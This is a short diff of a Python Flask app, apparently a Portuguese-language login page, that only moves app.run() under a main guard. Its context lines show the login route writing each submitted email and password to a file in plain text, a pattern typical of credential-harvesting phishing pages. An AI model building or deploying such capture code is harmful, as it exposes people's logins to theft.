@@ -16,6 +16,5 @@ def login():
             f.write(f'Email: {userLoginId} | Senha: {password}\n')
     return render_template('login/index.html')
 
-
-app.run()
-
+if __name__ == '__main__':
+	app.run()
